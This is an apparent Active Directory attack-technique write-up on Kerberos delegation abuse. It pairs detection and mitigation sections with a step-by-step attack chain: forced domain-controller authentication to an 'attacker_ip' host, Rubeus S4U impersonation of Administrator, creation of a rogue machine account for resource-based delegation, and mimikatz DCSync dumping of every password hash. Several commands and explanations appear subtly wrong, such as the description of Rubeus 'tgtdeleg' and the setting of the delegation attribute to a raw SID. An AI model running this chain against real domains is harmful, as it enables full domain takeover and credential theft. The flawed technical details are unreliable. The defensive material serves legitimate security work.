# [PE-VALID-004]: Delegation Misconfiguration (Kerberos Delegation Abuse)

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-004 |
| **MITRE ATT&CK v18.1** | [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |
| **Tactic** | Privilege Escalation, Lateral Movement |
| **Platforms** | Windows AD (Hybrid and on-premises) |
| **Severity** | **CRITICAL** |
| **CVE** | N/A (Configuration issue, not a bug) |
| **Technique Status** | ACTIVE (Mitigation available but requires configuration) |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2003 - 2022 (all versions vulnerable if misconfigured) |
| **Patched In** | N/A (requires administrative configuration, not a patch) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Kerberos delegation is a legitimate feature that allows service accounts to impersonate users when accessing other services. There are three types of delegation:

1. **Unconstrained Delegation** - Service can impersonate users to ANY service in the domain.
2. **Constrained Delegation** - Service can impersonate users to SPECIFIC services (listed in `msDS-AllowedToDelegateTo`).
3. **Resource-Based Constrained Delegation (RBCD)** - Defines which services can impersonate users TO this resource.

**Attackers exploit misconfigured delegation when:**
- Service accounts have unconstrained delegation enabled (should be constrained).
- Delegation is granted to services that can reach Domain Controllers (LDAP, HOST, CIFS).
- Sensitive/privileged accounts are not marked "sensitive and cannot be delegated".
- RBCD is misconfigured, allowing attacker-controlled accounts to impersonate Domain Admins.

**Attack Surface:** Kerberos Service Tickets (S4U2Self, S4U2Proxy), service account impersonation, LDAP/HOST/CIFS service access to Domain Controllers.

**Business Impact:** **Full domain compromise via impersonation of Domain Admins.** An attacker with access to a misconfigured service account can impersonate any non-protected Domain Admin account and gain equivalent privileges to access all domain resources and modify Active Directory.

**Technical Context:** This attack takes 5-20 minutes to execute, depending on delegation discovery time. It generates low audit trail (normal Kerberos operations) but can be detected with proper monitoring of S4U requests. The attack exploits legitimate Kerberos protocol features, making it difficult to distinguish from normal activity without baseline knowledge.

### Operational Risk
- **Execution Risk:** **Medium** - Requires compromised service account with delegation configured; not all environments have vulnerable delegation.
- **Stealth:** **High** - Uses legitimate Kerberos protocol; indistinguishable from normal operations without specific monitoring.
- **Reversibility:** **No** - Domain admin access is obtained; reverting requires password reset and credential rotation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.5 | Kerberos delegation restrictions |
| **DISA STIG** | V-3377, V-3378 | Kerberos delegation audit |
| **CISA SCuBA** | AC-2, AC-6 | Account management; Least privilege |
| **NIST 800-53** | AC-6, IA-4 | Least privilege; Account identifier |
| **GDPR** | Art. 32 | Security of Processing (authentication) |
| **DORA** | Art. 18 | ICT-related incident management |
| **NIS2** | Art. 21 | Cyber risk management (authentication) |
| **ISO 27001** | A.9.2.1, A.9.2.3 | User access management; Privileged access rights |
| **ISO 27005** | Section 8.2 | Risk treatment options |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Access to a service account configured with delegation (constrained or unconstrained).
- Ability to obtain the service account's credentials or NTLM hash / Kerberos key.

**Required Access:**
- Network access to Domain Controller (port 88 for Kerberos, 389/636 for LDAP, 445 for SMB).
- Ability to request Kerberos tickets from KDC.

**Supported Versions:**
- **Windows:** Server 2003 - 2022 (all versions)
- **Kerberos:** All implementations
- **Other Requirements:**
  - Service account must NOT have "Account is sensitive and cannot be delegated" flag set.
  - Delegation must target privileged services (LDAP, HOST, CIFS, HTTP) for escalation.
  - Target user must not be member of "Protected Users" group (Windows Server 2012 R2+).

**Tools:**
- [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos manipulation, S4U exploitation)
- [Impacket getST.py / getSPN.py](https://github.com/fortra/impacket) (Constrained delegation abuse)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit) (Delegation discovery)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) (Visual delegation abuse paths)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Identify Service Accounts with Delegation Enabled

**Objective:** Discover all service accounts configured for delegation (constrained or unconstrained).

**PowerShell Command:**
```powershell
# Find users with unconstrained delegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation, SamAccountName

# Find users with constrained delegation
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo, SamAccountName | 
  Select-Object SamAccountName, msDS-AllowedToDelegateTo

# Find computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation, SamAccountName

# Find computers with constrained delegation
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo, SamAccountName

# Expected output:
# SamAccountName                msDS-AllowedToDelegateTo
# ---------------               -------------------------
# exchange_service              ldap/dc01.domain.local, cifs/fileserver.domain.local
# web_app_account               http/webapp.domain.local, http/backup.domain.local
# backup_service                host/dc01.domain.local, host/dc02.domain.local
```

**What to Look For:**
- Unconstrained delegation on non-DC accounts (should be rare).
- Constrained delegation to **LDAP, HOST, CIFS, HTTP** services on Domain Controllers (high risk).
- Delegation to services that can access sensitive resources.
- Multiple delegation targets on a single account (increased risk).

---

### Step 2: Identify Delegation Paths to Domain Controllers

**Objective:** Find delegation paths that lead to Domain Admin impersonation capability.

**PowerShell Command:**
```powershell
# Find delegation to LDAP (DC-level access)
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*ldap*"} -Properties msDS-AllowedToDelegateTo | 
  Select-Object SamAccountName, msDS-AllowedToDelegateTo

# Find delegation to HOST service (full admin access)
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*host*"} -Properties msDS-AllowedToDelegateTo | 
  Select-Object SamAccountName, msDS-AllowedToDelegateTo

# Find delegation to CIFS (file share access)
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*cifs*"} -Properties msDS-AllowedToDelegateTo

# Expected high-risk output:
# exchange_service → ldap/dc01.domain.local, cifs/dc01.domain.local
# backup_svc → host/dc01.domain.local, host/dc02.domain.local
```

**What to Look For:**
- Delegation from non-DC accounts to DC services (highest risk).
- Delegation to HOST or LDAP on DCs (domain admin equivalent access).
- Multiple DCs in delegation targets (widespread vulnerability).

---

### Step 3: Check If Delegated Accounts Are Protected

**Objective:** Verify if accounts with delegation are marked "sensitive and cannot be delegated".

**PowerShell Command:**
```powershell
# Check for "sensitive and cannot be delegated" flag
$delegatedAccounts = Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties UserAccountControl

foreach ($account in $delegatedAccounts) {
    $uac = $account.UserAccountControl
    $isNotDelegated = [bool]($uac -band 0x100000)  # 0x100000 = NOT_DELEGATED flag
    
    Write-Host "$($account.SamAccountName): NOT_DELEGATED=$isNotDelegated"
}

# Expected output (vulnerable):
# exchange_service: NOT_DELEGATED=False
# backup_svc: NOT_DELEGATED=False

# If any Domain Admin accounts show NOT_DELEGATED=False, they are vulnerable to impersonation
$domainAdmins = Get-ADGroupMember -Identity "Domain Admins" -Recursive
foreach ($admin in $domainAdmins) {
    $adminObj = Get-ADUser -Identity $admin.SID -Properties UserAccountControl
    $uac = $adminObj.UserAccountControl
    $isNotDelegated = [bool]($uac -band 0x100000)
    
    if (!$isNotDelegated) {
        Write-Warning "VULNERABLE: Domain Admin $($adminObj.SamAccountName) can be delegated to!"
    }
}
```

**What to Look For:**
- If `NOT_DELEGATED=False` on service accounts with delegation: Vulnerability exists.
- If Domain Admin accounts show `NOT_DELEGATED=False`: High-risk misconfiguration.

---

### Step 4: Verify Target User Protection Status

**Objective:** Check if target users are members of "Protected Users" group (prevents delegation).

**PowerShell Command:**
```powershell
# Get members of Protected Users group
Get-ADGroupMember -Identity "Protected Users" -Recursive | Select-Object SamAccountName

# Check if specific Domain Admin is protected
$admin = Get-ADUser -Identity "Administrator"
$isProtected = Get-ADGroupMember -Identity "Protected Users" -Recursive | 
  Where-Object { $_.SID -eq $admin.SID }

if ($isProtected) {
    Write-Host "Administrator is PROTECTED from delegation"
} else {
    Write-Warning "Administrator is NOT PROTECTED from delegation - Vulnerable!"
}

# Expected output (secure):
# Protected Users members: (should include all Domain Admins)

# Expected output (vulnerable):
# Protected Users members: (empty or missing critical admin accounts)
```

**What to Look For:**
- If "Protected Users" is empty: Significant vulnerability (no accounts protected from delegation).
- If Domain Admins are not in "Protected Users": High-risk misconfiguration.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Unconstrained Delegation Abuse (Rubeus TGT Extraction)

**Supported Versions:** Windows Server 2003 - 2022

**Preconditions:**
- Compromised service account with unconstrained delegation enabled.
- Access to a machine where the service is running (or can force authentication to it).
- Ability to execute Rubeus or equivalent tool.

---

#### Step 1: Identify and Compromise Service Account with Unconstrained Delegation

**Objective:** Obtain credentials for a service account configured for unconstrained delegation.

**Command:**
```powershell
# Find unconstrained delegation accounts
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Example compromised account: WEBSERVER$, exchange_svc, backup_service

# Obtain NTLM hash or credentials
$credential = Get-Credential -Message "Enter service account credentials"
# Or use compromised hash: 09ecac4ad3b74c8b6a3e2b8b5c6d7e8f
```

**What This Means:**
- Service account credentials obtained (via phishing, credential spray, etc.).
- Account has `TrustedForDelegation` flag set.
- Account can now be used for TGT extraction and delegation abuse.

---

#### Step 2: Force Authentication from Domain Admin (Optional but Recommended)

**Objective:** Trigger a high-privilege user (Domain Admin) to authenticate to the compromised service.

**Methods:**
```powershell
# Option 1: Print Spooler Abuse (PrinterBug) - Forces DC to authenticate
# Requires: Spooler service running on DC

Invoke-PrinterBug -ComputerName dc01.domain.local -Printer "\\attacker_ip\share"

# Option 2: Petitpotam - MS-EFSR abuse
Invoke-Petitpotam -TargetName dc01.domain.local -CaptureIP attacker_ip

# Option 3: Direct authentication (if user connects naturally)
# Wait for legitimate user to connect to the service
```

**What This Means:**
- Domain Controller forced to authenticate to attacker's service.
- Authentication includes Domain Admin's TGT in the service ticket.
- TGT can now be extracted and used for delegation.

---

#### Step 3: Extract TGT Using Rubeus

**Objective:** Capture and extract the TGT from incoming authentication.

**Command (Windows):**
```powershell
# Download and run Rubeus
Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/download/v1.6.9/Rubeus.exe" `
  -OutFile "C:\Temp\Rubeus.exe"

# Extract TGT from incoming connections
C:\Temp\Rubeus.exe tgtdeleg /nowrap

# Expected output (when DC connects):
# [*] Waiting for incoming user credentials...
# [+] TGT extracted from authenticator!
# [+] Base64 encoded TGT:
# doIFXDCCBVigAwIBBaENGwtET01BSU4uQ09S...

# Save the TGT
$tgt = "doIFXDCCBVigAwIBBaENGwtET01BSU4uQ09S..."
$tgt | Out-File -FilePath "C:\Temp\admin_tgt.txt"
```

**What This Means:**
- TGT has been extracted from a high-privilege user (likely Domain Admin or DC computer account).
- TGT can now be used to request service tickets for any service.
- Access equivalent to the user whose TGT was extracted.

**Troubleshooting:**
- **No TGT extracted**: Force coercion method may have failed; retry PrinterBug or Petitpotam.
- **Wrong user TGT**: May have extracted low-privilege user; wait for Domain Admin connection.

---

#### Step 4: Use Extracted TGT for Domain Admin Access

**Objective:** Leverage the extracted TGT to access domain resources as Domain Admin.

**Command:**
```powershell
# Use extracted TGT to request service tickets
$tgtBase64 = "doIFXDCCBVigAwIBBaENGwtET01BSU4uQ09S..."

# Request LDAP service ticket (for DCSync)
C:\Temp\Rubeus.exe asktgs /ticket:$tgtBase64 /service:ldap/dc01.domain.local /ptt

# Or use Impacket for cross-platform
# export KRB5CCNAME="exported_tgt.ccache"
# secretsdump.py -k -no-pass domain.local/Administrator@dc01.domain.local

# Verify ticket is injected
C:\Temp\Rubeus.exe klist

# Expected output:
# [*] Current tickets:
# [+] Client: DC01$ @ DOMAIN.LOCAL
# [+] Server: ldap/dc01.domain.local @ DOMAIN.LOCAL
# [+] Expires: [timestamp]

# Perform DCSync to dump password hashes
mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv" exit
```

**What This Means:**
- Service ticket obtained as the extracted user (likely Domain Admin or DC account).
- LDAP service access achieved on Domain Controller.
- DCSync operation now possible (full password hash extraction).
- Full domain compromise achieved.

---

### METHOD 2: Constrained Delegation Abuse (S4U2Self + S4U2Proxy)

**Supported Versions:** Windows Server 2003 - 2022

**Preconditions:**
- Compromised service account with constrained delegation configured.
- Service account has SPN (Service Principal Name) registered.
- Constrained delegation points to high-privilege service (LDAP, HOST, CIFS).

---

#### Step 1: Identify Service Account with Constrained Delegation to Target Service

**Objective:** Find vulnerable service account whose delegation leads to Domain Admin access.

**Command:**
```powershell
# Find constrained delegation to LDAP/HOST/CIFS on DC
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*ldap*" -or msDS-AllowedToDelegateTo -like "*host*"} `
  -Properties msDS-AllowedToDelegateTo, SamAccountName

# Example vulnerable account:
# SamAccountName: exchange_svc
# msDS-AllowedToDelegateTo: ldap/dc01.domain.local, cifs/dc01.domain.local

# Obtain credentials or hash for this service account
# (Assume compromised via credential spray, phishing, or lateral movement)
```

**What to Look For:**
- Service accounts with delegation to LDAP on DC (highest risk).
- Service accounts with delegation to HOST (full admin access).
- Service accounts with delegation to CIFS on DC (file access, potential for escalation).

---

#### Step 2: Perform S4U2Self to Impersonate Domain Admin

**Objective:** Request a service ticket impersonating a Domain Admin user.

**Command (Using Rubeus):**
```powershell
# Get NTLM hash of service account (or use /password option)
$ntlmHash = "09ecac4ad3b74c8b6a3e2b8b5c6d7e8f"  # exchange_svc NTLM hash

# Perform S4U2Self to impersonate Administrator
C:\Temp\Rubeus.exe s4u /user:exchange_svc /rc4:$ntlmHash `
  /impersonateuser:Administrator /msdsspn:ldap/dc01.domain.local `
  /ptt /nowrap

# Expected output:
# [*] Performing S4U2Self/S4U2Proxy delegation for user: Administrator
# [+] S4U2Self successful!
# [+] Service ticket obtained for: Administrator
# [+] Ticket injected into current session (PTT)

# Verify ticket in cache
C:\Temp\Rubeus.exe klist
```

**What This Means:**
- S4U2Self extension used to request a service ticket for the service on behalf of Administrator.
- Ticket now claims to be for Administrator@LDAP/DC01.
- Ticket injected into current session (Pass-The-Ticket).
- Administrator privileges now available.

**Troubleshooting:**
- **Error: "Not trusted for delegation"**: Service account doesn't have constrained delegation configured.
- **Error: "User not delegable"**: Target user (Administrator) marked "sensitive and cannot be delegated".
- **Error: "Impersonation error"**: Service account not properly configured; verify SPN and delegation settings.

---

#### Step 3: Access Domain Controller Resources Using Delegated Ticket

**Objective:** Use the impersonated service ticket to access DC LDAP or other services.

**Command:**
```powershell
# Access DC C$ share as Administrator (via delegated ticket)
dir \\dc01.domain.local\c$

# Expected output (if successful):
# [Directory listing of DC01 C: drive]

# Perform DCSync using delegated ticket (LDAP access)
# Rubeus already injected ticket; Mimikatz can now use it
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt" exit

# Or use Impacket with delegated ticket
# secretsdump.py -k -no-pass domain.local/Administrator@dc01.domain.local
```

**What This Means:**
- Delegated ticket successfully used for authentication.
- Domain Controller resources now accessible.
- Password hashes extractable via DCSync.
- Full domain compromise achieved.

---

### METHOD 3: Resource-Based Constrained Delegation (RBCD) Abuse

**Supported Versions:** Windows Server 2012+

**Preconditions:**
- Ability to modify `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on target machine.
- Or: Compromised account with WriteProperty permission on target.
- Ability to create new machine account (or compromise existing one).

---

#### Step 1: Create Machine Account for Impersonation

**Objective:** Create a new computer account or compromise existing one to use for delegation.

**Command:**
```powershell
# Create new machine account (if user has quota)
$compName = "ATTACKER-PC"
$compPassword = "Passw0rd123!"

New-ADComputer -Name $compName -SamAccountName ($compName + "$") `
  -Path "CN=Computers,DC=domain,DC=local" -Enabled $true -PassThru

# Set password for the computer
Set-ADAccountPassword -Identity $compName -Reset -NewPassword (ConvertTo-SecureString $compPassword -AsPlainText -Force)

# Get computer SID
$compSID = (Get-ADComputer -Identity $compName).SID
Write-Host "Computer SID: $compSID"
```

**What This Means:**
- New machine account created in Active Directory.
- Account can be used for Kerberos delegation abuse.
- SID will be used to grant delegation rights on target resource.

---

#### Step 2: Modify Target Machine to Allow Delegation from Attacker Account

**Objective:** Grant the attacker's computer account permission to impersonate users on the target resource.

**Command:**
```powershell
# Get target machine (e.g., file server or application server)
$targetMachine = Get-ADComputer -Identity "FILESERVER01"
$targetDN = $targetMachine.DistinguishedName

# Get current RBCD settings
$acl = Get-Acl -Path "AD:\$targetDN"
$acl.Access | Where-Object { $_.ObjectType -eq "msDS-AllowedToActOnBehalfOfOtherIdentity" }

# Grant attacker computer account delegation rights on target
# Create security descriptor for RBCD
$acl = Get-Acl -Path "AD:\$targetDN"

# Add ACE allowing attacker computer to delegate
$sid = New-Object System.Security.Principal.SecurityIdentifier $compSID
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $sid,
    [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [GUID]"3f78c3e5-f79a-46bd-a0b8-55d0e1e8f4b5"  # GUID for msDS-AllowedToActOnBehalfOfOtherIdentity
)

$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\$targetDN" -AclObject $acl

# Alternatively, use PowerShell to directly set msDS-AllowedToActOnBehalfOfOtherIdentity
$sd = New-Object System.DirectoryServices.DirectoryEntrySecurity
$sd.SetAccessRuleProtection($false, $false)

# Add computer SID to allowed delegation
Set-ADComputer -Identity $targetMachine -Replace @{
    "msDS-AllowedToActOnBehalfOfOtherIdentity" = $sid
}

# Verify setting was applied
Get-ADComputer $targetMachine -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

**What This Means:**
- Target machine now allows attacker's computer account to impersonate any non-protected user.
- RBCD is now configured; attacker can request tickets on behalf of Domain Admins.

**OpSec & Evasion:**
- Event ID 5136 (Object Modified) logged if auditing enabled.
- High detection risk if SOC monitors msDS-AllowedToActOnBehalfOfOtherIdentity changes.

---

#### Step 3: Use RBCD to Impersonate Domain Admin

**Objective:** Request service tickets as Domain Admin using configured RBCD.

**Command:**
```powershell
# Request ticket for attacker computer account
$compPassword = "Passw0rd123!"

C:\Temp\Rubeus.exe asktgt /user:ATTACKER-PC$ /password:$compPassword `
  /domain:domain.local /dc:dc01.domain.local /outfile:attacker_tgt.kirbi

# Use S4U2Proxy to impersonate Administrator on target service
C:\Temp\Rubeus.exe s4u /ticket:attacker_tgt.kirbi /impersonateuser:Administrator `
  /msdsspn:cifs/fileserver01.domain.local /ptt

# Or target DC for ultimate access
C:\Temp\Rubeus.exe s4u /ticket:attacker_tgt.kirbi /impersonateuser:Administrator `
  /msdsspn:ldap/dc01.domain.local /ptt

# Verify ticket injection
C:\Temp\Rubeus.exe klist

# Access resources as Administrator
dir \\fileserver01.domain.local\c$
```

**What This Means:**
- S4U2Proxy request successfully impersonates Administrator.
- Service ticket obtained for backend service on behalf of Administrator.
- Full access to target resource as Domain Admin.
- If target is Domain Controller, DCSync is now possible (full domain compromise).

---

## 8. TOOLS & COMMANDS REFERENCE

### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.6.9+  
**Supported Platforms:** Windows (.NET)

**Installation:**
```powershell
Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/download/v1.6.9/Rubeus.exe" `
  -OutFile "C:\Temp\Rubeus.exe"
```

**Usage:**
```powershell
# Unconstrained delegation - TGT extraction
Rubeus.exe tgtdeleg /nowrap

# Constrained delegation - S4U abuse
Rubeus.exe s4u /user:service /rc4:hash /impersonateuser:admin /msdsspn:ldap/dc /ptt

# RBCD abuse
Rubeus.exe s4u /user:computer$ /password:pass /impersonateuser:admin /msdsspn:cifs/target /ptt
```

---

### [Impacket](https://github.com/fortra/impacket)

**Tools:** getST.py, getSPN.py, secretsdump.py

**Installation:**
```bash
pip3 install impacket
```

**Usage:**
```bash
# Constrained delegation with Impacket
getST.py -k -no-pass domain.local/service@dc01.domain.local

# DCSync with delegated ticket
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass domain.local/admin@dc01.domain.local
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Sentinel Query 1: S4U2Proxy Requests

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4769  // Service ticket request
| where ServiceName contains "$"
| where ImpersonatingLevel == "Delegation"
| project TimeGenerated, Account, ServiceName, SourceComputerName
```

---

### Sentinel Query 2: Delegation Configuration Changes

**KQL Query:**
```kusto
AuditLogs
| where OperationName contains "delegat" or OperationName contains "msDS-Allowed"
| where Result == "Success"
| project TimeGenerated, OperationName, Identity, TargetResources
```

---

## 10. WINDOWS EVENT LOG MONITORING

### Critical Event IDs

| Event ID | Source | Description | Severity |
|---|---|---|---|
| **4769** | Security | Service ticket request | LOW (baseline) |
| **5136** | Security | msDS-AllowedToDelegateTo modified | HIGH |
| **4768** | Security | TGT requested | LOW (baseline) |
| **4662** | Security | Object access (delegation objects) | MEDIUM |

---

### Detection Rule: Unusual S4U Requests

```powershell
# Monitor for S4U requests that impersonate privileged users
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4769
    StartTime = (Get-Date).AddHours(-1)
} | Where-Object {
    $_.Properties[2] -match "S4U" -or
    $_.Properties[3] -match "Administrator|Domain Admin|krbtgt"
} | ForEach-Object {
    Write-Host "ALERT: S4U request detected - possible delegation abuse"
}
```

---

## 11. DEFENSIVE MITIGATIONS

### Mitigation 1: Disable Unnecessary Unconstrained Delegation

**Objective:** Remove unconstrained delegation from all non-DC accounts.

**PowerShell:**
```powershell
# Find all non-DC accounts with unconstrained delegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | 
  Where-Object { $_.SamAccountName -notmatch "\$" } | 
  ForEach-Object {
    Set-ADUser -Identity $_ -TrustedForDelegation $false
    Write-Host "Disabled unconstrained delegation for: $($_.SamAccountName)"
  }

# Verify removal
Get-ADUser -Filter {TrustedForDelegation -eq $true}
```

**Impact:**
- Unconstrained delegation eliminated for regular service accounts.
- Reduces attack surface for TGT extraction attacks.

---

### Mitigation 2: Constrain Delegation to Specific Services Only

**Objective:** Replace unconstrained delegation with constrained delegation to only necessary services.

**PowerShell:**
```powershell
# Example: Constrain exchange_svc to only LDAP and CIFS on specific servers
Set-ADUser -Identity "exchange_svc" -TrustedForDelegation $false
Set-ADUser -Identity "exchange_svc" -Replace @{
    "msDS-AllowedToDelegateTo" = @(
        "ldap/dc01.domain.local",
        "ldap/dc02.domain.local",
        "cifs/fileserver01.domain.local"
    )
}

# Verify constrained delegation
Get-ADUser -Identity "exchange_svc" -Properties msDS-AllowedToDelegateTo
```

**Impact:**
- Service can only delegate to specified services.
- Reduces lateral movement possibilities.
- Still vulnerable if target service can reach sensitive resources.

---

### Mitigation 3: Mark Privileged Accounts as "Sensitive and Cannot Be Delegated"

**Objective:** Prevent Domain Admin and other privileged accounts from being impersonated via delegation.

**PowerShell:**
```powershell
# Mark all Domain Admins as "sensitive and cannot be delegated"
Get-ADGroupMember -Identity "Domain Admins" -Recursive | ForEach-Object {
    $user = Get-ADUser -Identity $_.DistinguishedName
    
    # Set NOT_DELEGATED flag (0x100000)
    $uac = $user.UserAccountControl
    $user.UserAccountControl = $uac -bor 0x100000
    Set-ADUser -Instance $user
    
    Write-Host "Marked $($_.SamAccountName) as NOT_DELEGATED"
}

# Verify setting
Get-ADGroupMember -Identity "Domain Admins" -Recursive | ForEach-Object {
    $user = Get-ADUser -Identity $_.DistinguishedName -Properties UserAccountControl
    $isNotDelegated = [bool]($user.UserAccountControl -band 0x100000)
    Write-Host "$($_.SamAccountName): NOT_DELEGATED=$isNotDelegated"
}
```

**Impact:**
- Domain Admins protected from delegation attacks.
- Constrained and unconstrained delegation cannot impersonate these accounts.
- Significantly reduces privilege escalation via delegation.

---

### Mitigation 4: Add Privileged Accounts to "Protected Users" Group

**Objective:** Use Windows Server 2012 R2+ Protected Users group for additional protection.

**PowerShell:**
```powershell
# Add all Domain Admins to Protected Users
$protectedUsers = Get-ADGroup -Identity "Protected Users"

Get-ADGroupMember -Identity "Domain Admins" -Recursive | ForEach-Object {
    Add-ADGroupMember -Identity $protectedUsers -Members $_.DistinguishedName -ErrorAction Continue
    Write-Host "Added $($_.SamAccountName) to Protected Users"
}

# Verify membership
Get-ADGroupMember -Identity "Protected Users" | Select-Object SamAccountName
```

**Impact:**
- Members of Protected Users cannot be impersonated via any delegation method.
- Requires Windows Server 2012 R2+ domain functional level.
- No compatibility issues with modern systems.

---

### Mitigation 5: Monitor and Audit Delegation Configurations

**Objective:** Continuous monitoring for unauthorized delegation changes.

**Group Policy:**
1. Open **Group Policy Management** (gpmc.msc).
2. Edit **Default Domain Controller Policy**.
3. Navigate: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Audit Policy**.
4. Enable:
   - **Audit Directory Service Changes**: Success
   - **Audit Directory Service Access**: Success

5. Apply and replicate.

**PowerShell Monitoring Script:**
```powershell
# Check for delegation changes periodically
$delegationNow = Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo

# Compare with previous baseline
# Alert if new delegation is added
```

**Impact:**
- Early detection of delegation abuse attempts.
- Audit trail for forensic investigation.

---

### Mitigation 6: Implement Tiered Administrative Model

**Objective:** Separate administrative access into tiers to limit delegation attack impact.

**Implementation:**
- **Tier 0:** Domain Controllers and critical infrastructure (highest protection).
- **Tier 1:** Servers and high-privilege applications (medium protection).
- **Tier 2:** Workstations and end-user systems (standard protection).

**Delegation rules by tier:**
- Tier 0 admins: NO delegation, Protected Users group.
- Tier 1 admins: Constrained delegation to Tier 1 resources only.
- Tier 2 admins: Limited delegation, monitored closely.

**Impact:**
- Compartmentalized risk; compromise of lower tier doesn't cascade to Tier 0.
- Reduces attack surface significantly.

---

## 14. DETECTION & INCIDENT RESPONSE

### Incident Response Playbook

**Step 1: Immediate Containment (First 30 minutes)**
```powershell
# 1. Identify compromised service account
Get-EventLog -LogName Security -EventID 4769 | 
  Where-Object { $_.EventData -match "S4U" } |
  Select-Object -First 1 TimeGenerated, EventData

# 2. Disable compromised account
Disable-ADAccount -Identity "exchange_svc"

# 3. Reset password for compromised account
$newPassword = [System.Web.Security.Membership]::GeneratePassword(16, 3)
Set-ADAccountPassword -Identity "exchange_svc" -Reset -NewPassword (ConvertTo-SecureString $newPassword -AsPlainText -Force)

# 4. Remove delegation configuration
Set-ADUser -Identity "exchange_svc" -TrustedForDelegation $false
Set-ADUser -Identity "exchange_svc" -Clear msDS-AllowedToDelegateTo

# 5. Remove any RBCD configurations pointing to it
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | 
  Where-Object { $_.msDS-AllowedToActOnBehalfOfOtherIdentity -match (Get-ADUser -Identity "exchange_svc").SID } | 
  ForEach-Object {
    Set-ADComputer -Identity $_ -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
  }
```

**Step 2: Evidence Collection (Hour 1-2)**
```powershell
# Collect delegation-related events
Get-WinEvent -LogName Security -FilterHashtable @{ EventID = 4769; StartTime = (Get-Date).AddDays(-3) } |
  Where-Object { $_.Properties[2] -match "S4U" } |
  Export-Csv -Path "C:\Incident\S4U_Requests.csv"

# Collect Kerberos TGT requests
Get-WinEvent -LogName Security -FilterHashtable @{ EventID = 4768; StartTime = (Get-Date).AddDays(-3) } |
  Export-Csv -Path "C:\Incident\TGT_Requests.csv"

# Collect delegation configuration changes
Get-WinEvent -LogName Security -FilterHashtable @{ EventID = 5136; StartTime = (Get-Date).AddDays(-3) } |
  Where-Object { $_.Properties[3] -match "msDS-AllowedToDelegateTo|msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  Export-Csv -Path "C:\Incident\Delegation_Changes.csv"
```

**Step 3: Root Cause Analysis (Hour 2-6)**
1. Identify which delegation misconfiguration was exploited.
2. Determine how attacker obtained service account credentials.
3. Check if multiple service accounts were compromised.
4. Review what resources were accessed using delegated tickets.
5. Identify if persistence was established (golden tickets, backdoor accounts).

**Step 4: Remediation (Hour 6+)**
1. Reset all Domain Admin passwords (twice, separately).
2. Reset krbtgt password (twice to invalidate Golden Tickets).
3. Remove all insecure delegation configurations.
4. Implement Mitigation strategies above.
5. Perform full domain password reset if compromise was extensive.

**Step 5: Prevention & Hardening**
- Implement tiered administrative model.
- Mark all privileged accounts as NOT_DELEGATED and add to Protected Users.
- Enable continuous monitoring of S4U requests.
- Quarterly penetration testing to identify new delegation misconfigurations.

---

## 15. REAL-WORLD EXAMPLES

### Example 1: Exchange Server Unconstrained Delegation

**Scenario:** Exchange server with unconstrained delegation for mailbox management.

**Attack Timeline:**
1. Attacker compromises low-privilege user via phishing.
2. Attacker identifies Exchange server with unconstrained delegation.
3. Attacker uses PrinterBug to force DC authentication to Exchange.
4. Attacker extracts DC's TGT from Exchange.
5. Within 10 minutes: Attacker has Domain Admin equivalent privileges.
6. Attacker dumps all domain password hashes via DCSync.

**Detection:** Unusual S4U requests in Kerberos logs, multiple TGT requests from Exchange service.

---

### Example 2: Service Account Constrained to LDAP on DC

**Scenario:** Application service account configured for constrained delegation to LDAP/DC01.

**Attack Timeline:**
1. Attacker compromises application service account credentials (via credential spray).
2. Attacker discovers constrained delegation to ldap/dc01.domain.local.
3. Attacker performs S4U2Self/S4U2Proxy to impersonate Domain Admin.
4. Attacker accesses DC LDAP service as Domain Admin.
5. Attacker modifies Domain Admin account ACLs, grants self DA privileges.
6. Full domain compromise achieved in 15 minutes.

**Detection:** Unusual LDAP authentication patterns from service account, S4U requests targeting LDAP.

---
